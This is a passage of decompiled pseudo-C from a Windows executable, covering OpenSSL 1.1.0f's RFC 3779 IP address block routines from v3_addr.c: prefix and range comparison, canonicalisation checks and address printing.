  const void **v2; // rcx
  int v3; // ebx
  const void **v4; // rax
  int v5; // edi
  const void *v6; // rdx
  int result; // eax

  v2 = **a1;
  v3 = *(_DWORD *)v2;
  v4 = **a2;
  v5 = *(_DWORD *)v4;
  v6 = v4[1];
  if ( *(_DWORD *)v2 <= *(_DWORD *)v4 )
    v4 = v2;
  result = memcmp(v2[1], v6, *(int *)v4);
  if ( !result )
    return v3 - v5;
  return result;
}

//----- (00000001400A8530) ----------------------------------------------------
void __fastcall sub_1400A8530(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011BA80);
}

//----- (00000001400A8550) ----------------------------------------------------
int __fastcall sub_1400A8550(__int64 a1, __int64 a2, int a3)
{
  int v3; // esi
  size_t v4; // rbx
  int v6; // ebp
  int **v7; // rax
  __int64 v8; // rsi
  __int64 v9; // rdi
  int v10; // ecx
  int *v11; // rsi
  __int64 v12; // rdi
  int v13; // ecx
  int **v14; // rax
  __int64 v15; // r14
  __int64 v16; // rdi
  int v17; // eax
  const void **v18; // r14
  __int64 v19; // rdi
  int v20; // eax
  int result; // eax
  char Buf2[16]; // [rsp+20h] [rbp-68h] BYREF
  char Buf1[16]; // [rsp+30h] [rbp-58h] BYREF

  v3 = 0;
  v4 = a3;
  v6 = 0;
  if ( *(_DWORD *)a1 )
  {
    if ( *(_DWORD *)a1 == 1 )
    {
      v7 = *(int ***)(a1 + 8);
      v8 = (__int64)*v7;
      v9 = **v7;
      if ( (int)v9 < 0 || (int)v9 > a3 )
        return -1;
      if ( (int)v9 > 0 )
      {
        memmove(Buf1, *(const void **)(v8 + 8), **v7);
        v10 = *(_DWORD *)(v8 + 16) & 7;
        if ( v10 )
          Buf1[(int)v9 - 1] &= ~(255 >> (8 - v10));
      }
      memset(&Buf1[v9], 0, (int)v4 - (int)v9);
      v3 = 8 * v4;
    }
  }
  else
  {
    v11 = *(int **)(a1 + 8);
    v12 = *v11;
    if ( (int)v12 < 0 || (int)v12 > a3 )
      return -1;
    if ( (int)v12 > 0 )
    {
      memmove(Buf1, *((const void **)v11 + 1), *v11);
      v13 = v11[4] & 7;
      if ( v13 )
        Buf1[(int)v12 - 1] &= ~(255 >> (8 - v13));
    }
    memset(&Buf1[v12], 0, (int)v4 - (int)v12);
    v3 = 8 * *v11 - (v11[4] & 7);
  }
  if ( !*(_DWORD *)a2 )
  {
    v18 = *(const void ***)(a2 + 8);
    v19 = *(int *)v18;
    if ( (int)v19 >= 0 && (int)v19 <= (int)v4 )
    {
      if ( (int)v19 > 0 )
      {
        memmove(Buf2, v18[1], *(int *)v18);
        v20 = (_DWORD)v18[2] & 7;
        if ( v20 )
          Buf2[(int)v19 - 1] &= ~(255 >> (8 - v20));
      }
      memset(&Buf2[v19], 0, (int)v4 - (int)v19);
      v6 = 8 * v19 - ((_DWORD)v18[2] & 7);
      goto LABEL_29;
    }
    return -1;
  }
  if ( *(_DWORD *)a2 == 1 )
  {
    v14 = *(int ***)(a2 + 8);
    v15 = (__int64)*v14;
    v16 = **v14;
    if ( (int)v16 >= 0 && (int)v16 <= (int)v4 )
    {
      if ( (int)v16 > 0 )
      {
        memmove(Buf2, *(const void **)(v15 + 8), **v14);
        v17 = *(_DWORD *)(v15 + 16) & 7;
        if ( v17 )
          Buf2[(int)v16 - 1] &= ~(255 >> (8 - v17));
      }
      memset(&Buf2[v16], 0, (int)v4 - (int)v16);
      v6 = 8 * v4;
      goto LABEL_29;
    }
    return -1;
  }
LABEL_29:
  result = memcmp(Buf1, Buf2, v4);
  if ( !result )
    return v3 - v6;
  return result;
}
// 1400A8550: using guessed type char Buf1[16];
// 1400A8550: using guessed type char Buf2[16];

//----- (00000001400A87A0) ----------------------------------------------------
__int64 __fastcall sub_1400A87A0(int *a1, int a2)
{
  int v2; // r14d
  int v4; // edx
  unsigned int v5; // ebx
  int v6; // r13d
  __int64 v7; // rsi
  __int64 v8; // rdi
  const void **v9; // rdx
  const void **v10; // rdx
  __int64 i; // rdx
  char v12; // cl
  int v13; // eax
  __int64 v14; // rax
  __int64 v15; // rdi
  __int64 v17; // [rsp+20h] [rbp-58h] BYREF
  char v18[16]; // [rsp+28h] [rbp-50h] BYREF
  char v19[16]; // [rsp+38h] [rbp-40h] BYREF
  char Buf1[16]; // [rsp+48h] [rbp-30h] BYREF
  char Buf2[16]; // [rsp+58h] [rbp-20h] BYREF

  v2 = 0;
  v4 = a2 - 1;
  if ( v4 )
  {
    if ( v4 == 1 )
      v5 = 16;
    else
      v5 = 0;
  }
  else
  {
    v5 = 4;
  }
  sub_140029830(a1);
  if ( (int)(sub_1400296E0((unsigned int *)a1) - 1) <= 0 )
  {
LABEL_34:
    v13 = sub_1400296E0((unsigned int *)a1);
    v14 = sub_140029880((__int64)a1, v13 - 1);
    v15 = v14;
    if ( !v14
      || *(_DWORD *)v14 != 1
      || (unsigned int)sub_1400A90E0(v19, **(const void ****)(v14 + 8), v5, 0)
      && (unsigned int)sub_1400A90E0(Buf1, *(const void ***)(*(_QWORD *)(v15 + 8) + 8i64), v5, 0xFFu)
      && memcmp(v19, Buf1, v5) <= 0 )
    {
      return 1i64;
    }
  }
  else
  {
    v6 = 1;
    while ( 1 )
    {
      v7 = sub_140029880((__int64)a1, v2);
      v8 = sub_140029880((__int64)a1, v6);
      if ( !v7 )
        break;
      if ( *(_DWORD *)v7 )
      {
        if ( *(_DWORD *)v7 != 1 || !(unsigned int)sub_1400A90E0(Buf1, **(const void ****)(v7 + 8), v5, 0) )
          return 0i64;
        v9 = *(const void ***)(*(_QWORD *)(v7 + 8) + 8i64);
      }
      else
      {
        if ( !(unsigned int)sub_1400A90E0(Buf1, *(const void ***)(v7 + 8), v5, 0) )
          return 0i64;
        v9 = *(const void ***)(v7 + 8);
      }
      if ( !(unsigned int)sub_1400A90E0(Buf2, v9, v5, 0xFFu) || !v8 )
        return 0i64;
      if ( *(_DWORD *)v8 )
      {
        if ( *(_DWORD *)v8 != 1 || !(unsigned int)sub_1400A90E0(v18, **(const void ****)(v8 + 8), v5, 0) )
          return 0i64;
        v10 = *(const void ***)(*(_QWORD *)(v8 + 8) + 8i64);
      }
      else
      {
        if ( !(unsigned int)sub_1400A90E0(v18, *(const void ***)(v8 + 8), v5, 0) )
          return 0i64;
        v10 = *(const void ***)(v8 + 8);
      }
      if ( !(unsigned int)sub_1400A90E0(v19, v10, v5, 0xFFu)
        || memcmp(Buf1, Buf2, v5) > 0
        || memcmp(v18, v19, v5) > 0
        || memcmp(Buf2, v18, v5) >= 0 )
      {
        return 0i64;
      }
      for ( i = v5 - 1i64; i >= 0; --i )
      {
        v12 = v18[i];
        v18[i] = v12 - 1;
        if ( v12 )
          break;
      }
      if ( !memcmp(Buf2, v18, v5) )
      {
        if ( !(unsigned int)sub_1400A9700(&v17, Buf1, v19, v5) )
          return 0i64;
        sub_1400297E0((__int64)a1, v2, v17);
        sub_140029370(a1, v6);
        sub_140051250((unsigned int *)v7, (__int64)&unk_14011B9A0);
        sub_140051250((unsigned int *)v8, (__int64)&unk_14011B9A0);
        --v2;
        --v6;
      }
      ++v2;
      ++v6;
      if ( v2 >= (int)(sub_1400296E0((unsigned int *)a1) - 1) )
        goto LABEL_34;
    }
  }
  return 0i64;
}
// 1400A87A0: using guessed type char var_50[16];

//----- (00000001400A8AD0) ----------------------------------------------------
__int64 __fastcall sub_1400A8AD0(int *a1, __int16 a2, char *a3)
{
  __int64 v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rcx
  __int64 v7; // rax

  v3 = sub_1400A94B0(a1, a2, a3);
  v4 = v3;
  if ( v3 )
  {
    v5 = *(_QWORD *)(v3 + 8);
    if ( v5 )
    {
      if ( *(_DWORD *)v5 != 1 || !*(_QWORD *)(v5 + 8) )
      {
        if ( *(_DWORD *)v5 )
        {
          if ( *(_QWORD *)(v5 + 8) )
          {
LABEL_10:
            **(_DWORD **)(v4 + 8) = 0;
            return 1i64;
          }
        }
        else if ( *(_QWORD *)(v5 + 8) )
        {
          return 1i64;
        }
        v7 = sub_14004FE90();
        *(_QWORD *)(*(_QWORD *)(v4 + 8) + 8i64) = v7;
        if ( v7 )
          goto LABEL_10;
      }
    }
  }
  return 0i64;
}

//----- (00000001400A8B50) ----------------------------------------------------
__int64 __fastcall sub_1400A8B50(int *a1, int a2, char *a3, _BYTE *a4, int a5)
{
  int *v6; // rdi
  unsigned int *v7; // rbx
  unsigned int *v9; // [rsp+20h] [rbp-18h] BYREF

  v6 = (int *)sub_1400A9970(a1, a2, a3);
  if ( v6 && (unsigned int)sub_1400A9600((__int64 *)&v9, a4, a5) )
  {
    v7 = v9;
    if ( (unsigned int)sub_1400297C0(v6, (__int64)v9) )
      return 1i64;
    sub_140051250(v7, (__int64)&unk_14011B9A0);
  }
  return 0i64;
}

//----- (00000001400A8BD0) ----------------------------------------------------
__int64 __fastcall sub_1400A8BD0(int *a1)
{
  int v2; // ebx
  __int64 *v3; // rax
  __int64 v4; // rcx
  __int64 v5; // rax
  unsigned __int8 *v6; // rax
  int v7; // edx

  v2 = 0;
  if ( (int)sub_1400296E0((unsigned int *)a1) <= 0 )
  {
LABEL_9:
    sub_140029810((__int64)a1, (__int64)sub_1400A84E0);
    sub_140029830(a1);
    if ( !(unsigned int)sub_1400A8CA0((unsigned int *)a1) )
      sub_1400234A0(
        "assertion failed: X509v3_addr_is_canonical(addr)",
        "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c",
        878i64);
    return 1i64;
  }
  else
  {
    while ( 1 )
    {
      v3 = (__int64 *)sub_140029880((__int64)a1, v2);
      v4 = v3[1];
      if ( *(_DWORD *)v4 == 1 )
      {
        v5 = *v3;
        if ( v5 && (v6 = *(unsigned __int8 **)(v5 + 8)) != 0i64 )
          v7 = v6[1] | (*v6 << 8);
        else
          v7 = 0;
        if ( !(unsigned int)sub_1400A87A0(*(int **)(v4 + 8), v7) )
          return 0i64;
      }
      if ( ++v2 >= (int)sub_1400296E0((unsigned int *)a1) )
        goto LABEL_9;
    }
  }
}

//----- (00000001400A8CA0) ----------------------------------------------------
__int64 __fastcall sub_1400A8CA0(unsigned int *a1)
{
  signed int v3; // edi
  __int64 v4; // rax
  const void ***v5; // rbx
  const void ***v6; // rax
  const void **v7; // rcx
  int v8; // ebx
  const void **v9; // rax
  int v10; // esi
  const void *v11; // rdx
  int v12; // eax
  bool v13; // sf
  int v14; // esi
  _QWORD *v15; // rax
  unsigned __int8 *v16; // rcx
  int v17; // edx
  int v18; // edx
  __int64 v19; // rbx
  __int64 v20; // r13
  __int64 v21; // rcx
  unsigned int *v22; // r15
  signed int v23; // r14d
  __int64 v24; // rax
  __int64 v25; // rsi
  __int64 v26; // rdi
  const void **v27; // rdx
  const void **v28; // rdx
  __int64 i; // rax
  char v30; // dl
  int v31; // eax
  __int64 v32; // rax
  __int64 v33; // rdi
  int v34; // [rsp+20h] [rbp-19h]
  char v35[16]; // [rsp+28h] [rbp-11h] BYREF
  char Buf1[16]; // [rsp+38h] [rbp-1h] BYREF
  char Buf2[16]; // [rsp+48h] [rbp+Fh] BYREF
  char v38[16]; // [rsp+58h] [rbp+1Fh] BYREF

  if ( !a1 )
    return 1i64;
  v3 = 0;
  while ( v3 < (int)(sub_1400296E0(a1) - 1) )
  {
    v4 = sub_140029880((__int64)a1, v3++);
    v5 = (const void ***)v4;
    v6 = (const void ***)sub_140029880((__int64)a1, v3);
    v7 = *v5;
    v8 = *(_DWORD *)*v5;
    v9 = *v6;
    v10 = *(_DWORD *)v9;
    v11 = v9[1];
    if ( v8 <= *(_DWORD *)v9 )
      v9 = v7;
    v12 = memcmp(v7[1], v11, *(int *)v9);
    v13 = v12 < 0;
    if ( !v12 )
      v13 = v8 - v10 < 0;
    if ( !v13 )
      return 0i64;
  }
  v14 = 0;
  v34 = 0;
  if ( (int)sub_1400296E0(a1) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v15 = (_QWORD *)sub_140029880((__int64)a1, v14);
    if ( v15 && *v15 && (v16 = *(unsigned __int8 **)(*v15 + 8i64)) != 0i64 )
      v17 = v16[1] | (*v16 << 8);
    else
      v17 = 0;
    v18 = v17 - 1;
    if ( !v18 )
    {
      v19 = 4i64;
      goto LABEL_22;
    }
    if ( v18 == 1 )
    {
      v19 = 16i64;
LABEL_22:
      v20 = v19;
      goto LABEL_23;
    }
    LODWORD(v19) = 0;
    v20 = 0i64;
LABEL_23:
    if ( !v15 )
      return 0i64;
    v21 = v15[1];
    if ( !v21 )
      return 0i64;
    if ( *(_DWORD *)v21 )
      break;
LABEL_62:
    v34 = ++v14;
    if ( v14 >= (int)sub_1400296E0(a1) )
      return 1i64;
  }
  if ( *(_DWORD *)v21 != 1 )
    return 0i64;
  v22 = *(unsigned int **)(v21 + 8);
  if ( !(unsigned int)sub_1400296E0(v22) )
    return 0i64;
  v23 = 0;
  if ( (int)(sub_1400296E0(v22) - 1) <= 0 )
  {
LABEL_56:
    v31 = sub_1400296E0(v22);
    v32 = sub_140029880((__int64)v22, v31 - 1);
    v33 = v32;
    if ( v32
      && *(_DWORD *)v32 == 1
      && (!(unsigned int)sub_1400A90E0(Buf1, **(const void ****)(v32 + 8), v19, 0)
       || !(unsigned int)sub_1400A90E0(v35, *(const void ***)(*(_QWORD *)(v33 + 8) + 8i64), v19, 0xFFu)
       || memcmp(Buf1, v35, (unsigned int)v19) > 0
       || (int)sub_1400A9A40(Buf1, v35, v19) >= 0) )
    {
      return 0i64;
    }
    goto LABEL_62;
  }
  while ( 1 )
  {
    v24 = sub_140029880((__int64)v22, v23++);
    v25 = v24;
    v26 = sub_140029880((__int64)v22, v23);
    if ( !v25 )
      return 0i64;
    if ( *(_DWORD *)v25 )
    {
      if ( *(_DWORD *)v25 != 1 || !(unsigned int)sub_1400A90E0(Buf1, **(const void ****)(v25 + 8), v19, 0) )
        return 0i64;
      v27 = *(const void ***)(*(_QWORD *)(v25 + 8) + 8i64);
    }
    else
    {
      if ( !(unsigned int)sub_1400A90E0(Buf1, *(const void ***)(v25 + 8), v19, 0) )
        return 0i64;
      v27 = *(const void ***)(v25 + 8);
    }
    if ( !(unsigned int)sub_1400A90E0(v35, v27, v19, 0xFFu) || !v26 )
      return 0i64;
    if ( *(_DWORD *)v26 )
    {
      if ( *(_DWORD *)v26 != 1 || !(unsigned int)sub_1400A90E0(Buf2, **(const void ****)(v26 + 8), v19, 0) )
        return 0i64;
      v28 = *(const void ***)(*(_QWORD *)(v26 + 8) + 8i64);
    }
    else
    {
      if ( !(unsigned int)sub_1400A90E0(Buf2, *(const void ***)(v26 + 8), v19, 0) )
        return 0i64;
      v28 = *(const void ***)(v26 + 8);
    }
    if ( !(unsigned int)sub_1400A90E0(v38, v28, v19, 0xFFu)
      || memcmp(Buf1, Buf2, (unsigned int)v19) >= 0
      || memcmp(Buf1, v35, (unsigned int)v19) > 0
      || memcmp(Buf2, v38, (unsigned int)v19) > 0 )
    {
      return 0i64;
    }
    for ( i = v20 - 1; i >= 0; --i )
    {
      v30 = Buf2[i];
      Buf2[i] = v30 - 1;
      if ( v30 )
        break;
    }
    if ( memcmp(v35, Buf2, (unsigned int)v19) >= 0 || *(_DWORD *)v25 == 1 && (int)sub_1400A9A40(Buf1, v35, v19) >= 0 )
      return 0i64;
    if ( v23 >= (int)(sub_1400296E0(v22) - 1) )
    {
      v14 = v34;
      goto LABEL_56;
    }
  }
}
// 1400A8CA0: using guessed type char Buf2[16];

//----- (00000001400A90E0) ----------------------------------------------------
__int64 __fastcall sub_1400A90E0(char *a1, const void **a2, int a3, unsigned __int8 a4)
{
  size_t v4; // rax
  int v9; // ecx
  int v10; // edx
  __int64 v11; // rax

  v4 = *(int *)a2;
  if ( (v4 & 0x80000000) != 0i64 || (int)v4 > a3 )
    return 0i64;
  if ( (int)v4 > 0 )
  {
    memmove(a1, a2[1], v4);
    v9 = (_DWORD)a2[2] & 7;
    if ( v9 )
    {
      v10 = 255 >> (8 - v9);
      v11 = *(_DWORD *)a2 - 1;
      if ( a4 )
        a1[v11] |= v10;
      else
        a1[v11] &= ~(_BYTE)v10;
    }
  }
  memset(&a1[*(int *)a2], a4, a3 - *(_DWORD *)a2);
  return 1i64;
}

//----- (00000001400A9190) ----------------------------------------------------
__int64 __fastcall sub_1400A9190(__int64 a1, unsigned int a2, unsigned int *a3, int a4)
{
  int v8; // esi
  __int64 v9; // rdi

  v8 = 0;
  if ( (int)sub_1400296E0(a3) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v9 = sub_140029880((__int64)a3, v8);
    sub_14002A590(a1, "%*s", a2, byte_1400D7DAE);
    if ( *(_DWORD *)v9 )
      break;
    if ( !(unsigned int)sub_1400A92D0(a1, a4, 0, *(_QWORD *)(v9 + 8)) )
      return 0i64;
    sub_14002A590(a1, "/%d\n", 8 * **(_DWORD **)(v9 + 8) - (*(_DWORD *)(*(_QWORD *)(v9 + 8) + 16i64) & 7u));
LABEL_9:
    if ( ++v8 >= (int)sub_1400296E0(a3) )
      return 1i64;
  }
  if ( *(_DWORD *)v9 != 1 )
    goto LABEL_9;
  if ( (unsigned int)sub_1400A92D0(a1, a4, 0, **(_QWORD **)(v9 + 8)) )
  {
    sub_14002A1A0(a1, (__int64)"-");
    if ( (unsigned int)sub_1400A92D0(a1, a4, 0xFFu, *(_QWORD *)(*(_QWORD *)(v9 + 8) + 8i64)) )
    {
      sub_14002A1A0(a1, (__int64)"\n");
      goto LABEL_9;
    }
  }
  return 0i64;
}

//----- (00000001400A92D0) ----------------------------------------------------
__int64 __fastcall sub_1400A92D0(__int64 a1, int a2, unsigned __int8 a3, __int64 a4)
{
  int v7; // edx
  int v8; // ebx
  __int64 v9; // r14
  __int16 *v10; // r8
  int v11; // edi
  __int64 i; // rax
  int v13; // ebx
  __int64 v14; // rsi
  __int16 *v15; // r9
  __int64 v16; // [rsp+28h] [rbp-50h]
  unsigned __int8 v17; // [rsp+30h] [rbp-48h] BYREF
  char v18[14]; // [rsp+31h] [rbp-47h]

  if ( *(int *)a4 < 0 )
    return 0i64;
  v7 = a2 - 1;
  if ( v7 )
  {
    if ( v7 != 1 )
    {
      v8 = 0;
      if ( *(int *)a4 > 0 )
      {
        v9 = 0i64;
        do
        {
          v10 = (__int16 *)byte_1400D7DAE;
          if ( v8 > 0 )
            v10 = word_1400F6B40;
          sub_14002A590(a1, "%s%02x", v10, *(unsigned __int8 *)(v9 + *(_QWORD *)(a4 + 8)));
          ++v8;
          ++v9;
        }
        while ( v8 < *(_DWORD *)a4 );
      }
      sub_14002A590(a1, "[%d]", *(_DWORD *)(a4 + 16) & 7);
      return 1i64;
    }
    v11 = 16;
    if ( (unsigned int)sub_1400A90E0((char *)&v17, (const void **)a4, 16, a3) )
    {
      for ( i = 16i64; i > 1; i -= 2i64 )
      {
        if ( *((_BYTE *)&v16 + i + 7) )
          break;
        if ( *((_BYTE *)&v16 + i + 6) )
          break;
        v11 -= 2;
      }
      v13 = 0;
      v14 = 0i64;
      if ( v11 <= 0i64 )
        goto LABEL_21;
      do
      {
        v15 = (__int16 *)byte_1400D7DAE;
        if ( v13 < 14 )
          v15 = word_1400F6B40;
        sub_14002A590(a1, "%x%s", (unsigned __int8)v18[v14] | (v18[v14 - 1] << 8), v15);
        v13 += 2;
        v14 += 2i64;
      }
      while ( v14 < v11 );
      if ( v13 < 16 )
LABEL_21:
        sub_14002A1A0(a1, (__int64)word_1400F6B40);
      if ( !v13 )
        sub_14002A1A0(a1, (__int64)word_1400F6B40);
      return 1i64;
    }
    return 0i64;
  }
  if ( !(unsigned int)sub_1400A90E0((char *)&v17, (const void **)a4, 4, a3) )
    return 0i64;
  LODWORD(v16) = (unsigned __int8)v18[2];
  sub_14002A590(a1, "%d.%d.%d.%d", v17, (unsigned __int8)v18[0], (unsigned __int8)v18[1], v16);
  return 1i64;
}
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (00000001400A94B0) ----------------------------------------------------
__int64 __fastcall sub_1400A94B0(int *a1, __int16 a2, char *a3)
{
  unsigned int v4; // esi
  int v5; // ebx
  __int64 v6; // rax
  __int64 v7; // rdi
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v10; // rax
  _DWORD *v11; // rax
  char Buf2; // [rsp+38h] [rbp+10h] BYREF
  char v14; // [rsp+39h] [rbp+11h]
  char v15; // [rsp+3Ah] [rbp+12h]

  v14 = a2;
  Buf2 = HIBYTE(a2);
  if ( a3 )
  {
    v4 = 3;
    v15 = *a3;
  }
  else
  {
    v4 = 2;
  }
  v5 = 0;
  if ( (int)sub_1400296E0((unsigned int *)a1) <= 0 )
  {
LABEL_10:
    v8 = sub_140050B70((__int64)&unk_14011BA80);
    v9 = v8;
    if ( v8
      && (*(_QWORD *)(v8 + 8) || (v10 = sub_140050B70((__int64)&unk_14011BA10), (*(_QWORD *)(v9 + 8) = v10) != 0i64))
      && (*(_QWORD *)v9 || (v11 = sub_14004FEE0(), (*(_QWORD *)v9 = v11) != 0i64))
      && (unsigned int)sub_14006B0A0(*(_QWORD *)v9, &Buf2, v4)
      && (unsigned int)sub_1400297C0(a1, v9) )
    {
      return v9;
    }
    else
    {
      sub_140051250((unsigned int *)v9, (__int64)&unk_14011BA80);
      return 0i64;
    }
  }
  else
  {
    while ( 1 )
    {
      v6 = sub_140029880((__int64)a1, v5);
      v7 = v6;
      if ( !*(_QWORD *)(*(_QWORD *)v6 + 8i64) )
        sub_1400234A0(
          "assertion failed: f->addressFamily->data != NULL",
          "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c",
          499i64);
      if ( **(_DWORD **)v6 == v4 && !memcmp(*(const void **)(*(_QWORD *)v6 + 8i64), &Buf2, v4) )
        return v7;
      if ( ++v5 >= (int)sub_1400296E0((unsigned int *)a1) )
        goto LABEL_10;
    }
  }
}

//----- (00000001400A9600) ----------------------------------------------------
__int64 __fastcall sub_1400A9600(__int64 *a1, _BYTE *a2, int a3)
{
  int v5; // ebp
  int v6; // ebx
  __int64 v7; // rax
  __int64 v8; // rdi
  bool v9; // zf
  _DWORD *v10; // rax
  _BYTE *v12; // r8

  v5 = (a3 + 7) / 8;
  v6 = a3 % 8;
  v7 = sub_140050B70((__int64)&unk_14011B9A0);
  v8 = v7;
  if ( !v7 )
    return 0i64;
  v9 = *(_QWORD *)(v7 + 8) == 0i64;
  *(_DWORD *)v7 = 0;
  if ( v9 && (v10 = sub_14004FDA0(), (*(_QWORD *)(v8 + 8) = v10) == 0i64)
    || !(unsigned int)sub_14006B0A0(*(_QWORD *)(v8 + 8), a2, v5) )
  {
    sub_140051250((unsigned int *)v8, (__int64)&unk_14011B9A0);
    return 0i64;
  }
  *(_DWORD *)(*(_QWORD *)(v8 + 8) + 16i64) &= 0xFFFFFFF8;
  *(_DWORD *)(*(_QWORD *)(v8 + 8) + 16i64) |= 8u;
  if ( v6 > 0 )
  {
    v12 = (_BYTE *)(*(_QWORD *)(*(_QWORD *)(v8 + 8) + 8i64) + v5 - 1);
    *v12 &= ~(255 >> v6);
    *(_DWORD *)(*(_QWORD *)(v8 + 8) + 16i64) |= 8 - v6;
  }
  *a1 = v8;
  return 1i64;
}

//----- (00000001400A9700) ----------------------------------------------------
__int64 __fastcall sub_1400A9700(__int64 *a1, char *a2, char *a3, int a4)
{
  __int64 v5; // rsi
  int v8; // eax
  __int64 result; // rax
  __int64 v10; // rdi
  bool v11; // zf
  _QWORD *v12; // rax
  _DWORD *v13; // rax
  _DWORD *v14; // rax
  int v15; // ebp
  __int64 v16; // rbx
  __int64 v17; // rax
  int v18; // edx
  int v19; // r8d
  int v20; // r8d
  __int64 v21; // rcx

  v5 = a4;
  v8 = sub_1400A9A40(a2, a3, a4);
  if ( v8 >= 0 )
    return sub_1400A9600(a1, a2, v8);
  result = sub_140050B70((__int64)&unk_14011B9A0);
  v10 = result;
  if ( result )
  {
    v11 = *(_QWORD *)(result + 8) == 0i64;
    *(_DWORD *)result = 1;
    if ( !v11 )
      sub_1400234A0(
        "assertion failed: aor->u.addressRange == NULL",
        "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c",
        432i64);
    v12 = (_QWORD *)sub_140050B70((__int64)&unk_14011B930);
    *(_QWORD *)(v10 + 8) = v12;
    if ( !v12 )
      goto LABEL_28;
    if ( !*v12 )
    {
      v13 = sub_14004FDA0();
      **(_QWORD **)(v10 + 8) = v13;
      if ( !v13 )
        goto LABEL_28;
    }
    if ( !*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) )
    {
      v14 = sub_14004FDA0();
      *(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) = v14;
      if ( !v14 )
        goto LABEL_28;
    }
    v15 = v5;
    v16 = v5;
    v17 = v5;
    if ( (int)v5 > 0 )
    {
      do
      {
        if ( a2[v17 - 1] )
          break;
        --v15;
        --v17;
      }
      while ( v17 > 0 );
    }
    if ( !(unsigned int)sub_14006B0A0(**(_QWORD **)(v10 + 8), a2, v15) )
      goto LABEL_28;
    *(_DWORD *)(**(_QWORD **)(v10 + 8) + 16i64) &= 0xFFFFFFF8;
    *(_DWORD *)(**(_QWORD **)(v10 + 8) + 16i64) |= 8u;
    if ( v15 > 0 )
    {
      v18 = 1;
      v19 = (unsigned __int8)a2[v15 - 1];
      if ( (v19 & 0x7F) != 0 )
      {
        do
          ++v18;
        while ( ((0xFFu >> v18) & v19) != 0 );
      }
      *(_DWORD *)(**(_QWORD **)(v10 + 8) + 16i64) |= 8 - v18;
    }
    if ( (int)v5 > 0 )
    {
      do
      {
        if ( a3[v16 - 1] != -1 )
          break;
        LODWORD(v5) = v5 - 1;
        --v16;
      }
      while ( v16 > 0 );
    }
    if ( (unsigned int)sub_14006B0A0(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64), a3, v5) )
    {
      *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 16i64) &= 0xFFFFFFF8;
      *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 16i64) |= 8u;
      if ( (int)v5 > 0 )
      {
        v20 = 1;
        v21 = (int)v5 - 1;
        if ( (a3[v21] & 0x7F) != 127 )
        {
          do
            ++v20;
          while ( ((unsigned __int8)a3[v21] & (0xFFu >> v20)) != 0xFFu >> v20 );
        }
        *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 16i64) |= 8 - v20;
      }
      *a1 = v10;
      return 1i64;
    }
    else
    {
LABEL_28:
      sub_140051250((unsigned int *)v10, (__int64)&unk_14011B9A0);
      return 0i64;
    }
  }
  return result;
}

//----- (00000001400A9970) ----------------------------------------------------
_QWORD *__fastcall sub_1400A9970(int *a1, int a2, char *a3)
{
  __int64 v4; // rax
  __int64 v5; // rsi
  __int64 v6; // rcx
  _QWORD *result; // rax
  _QWORD *v8; // rbx
  int v9; // edi
  int (__fastcall *v10)(__int64 *, __int64 *); // rdx

  v4 = sub_1400A94B0(a1, a2, a3);
  v5 = v4;
  if ( !v4 )
    return 0i64;
  v6 = *(_QWORD *)(v4 + 8);
  if ( !v6 || !*(_DWORD *)v6 && *(_QWORD *)(v6 + 8) )
    return 0i64;
  if ( *(_DWORD *)v6 != 1 || (result = *(_QWORD **)(v6 + 8)) == 0i64 )
  {
    result = sub_1400296C0();
    v8 = result;
    if ( result )
    {
      v9 = a2 - 1;
      if ( v9 )
      {
        if ( v9 != 1 )
        {
LABEL_14:
          **(_DWORD **)(v5 + 8) = 1;
          *(_QWORD *)(*(_QWORD *)(v5 + 8) + 8i64) = v8;
          return v8;
        }
        v10 = sub_1400A9C60;
      }
      else
      {
        v10 = sub_1400A9C40;
      }
      sub_140029810((__int64)result, (__int64)v10);
      goto LABEL_14;
    }
  }
  return result;
}

//----- (00000001400A9A40) ----------------------------------------------------
__int64 __fastcall sub_1400A9A40(const void *a1, char *a2, int a3)
{
  __int64 v3; // rsi
  int v6; // r8d
  _BYTE *v7; // rcx
  int v8; // edx
  char *v9; // rcx
  char v11; // r9
  unsigned __int8 v12; // r10
  unsigned __int8 v13; // dl
  int v14; // eax

  v3 = a3;
  if ( memcmp(a1, a2, a3) > 0 )
    sub_1400234A0(
      "assertion failed: memcmp(min, max, length) <= 0",
      "..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_addr.c",
      343i64);
  v6 = 0;
  if ( (int)v3 > 0 )
  {
    v7 = a2;
    do
    {
      if ( v7[(_BYTE *)a1 - a2] != *v7 )
        break;
      ++v7;
      ++v6;
    }
    while ( v7 - a2 < v3 );
  }
  v8 = v3 - 1;
  if ( (int)v3 - 1 >= 0 )
  {
    v9 = &a2[v8];
    do
    {
      if ( v9[(_BYTE *)a1 - a2] )
        break;
      if ( *v9 != -1 )
        break;
      --v9;
      --v8;
    }
    while ( v9 - a2 >= 0 );
  }
  if ( v6 < v8 )
    return 0xFFFFFFFFi64;
  if ( v6 > v8 )
    return (unsigned int)(8 * v6);
  v11 = a2[v6];
  v12 = *((_BYTE *)a1 + v6);
  v13 = v12 ^ v11;
  switch ( v12 ^ (unsigned __int8)v11 )
  {
    case 1:
      v14 = 7;
      break;
    case 3:
      v14 = 6;
      break;
    case 7:
      v14 = 5;
      break;
    case 15:
      v14 = 4;
      break;
    case 31:
      v14 = 3;
      break;
    case 63:
      v14 = 2;
      break;
    case 127:
      v14 = 1;
      break;
    default:
      return 0xFFFFFFFFi64;
  }
  if ( (v12 & v13) != 0 || (v13 & (unsigned __int8)v11) != v13 )
    return 0xFFFFFFFFi64;
  else
    return (unsigned int)(v14 + 8 * v6);
}

//----- (00000001400A9C40) ----------------------------------------------------
int __fastcall sub_1400A9C40(__int64 *a1, __int64 *a2)
{
  int v2; // eax

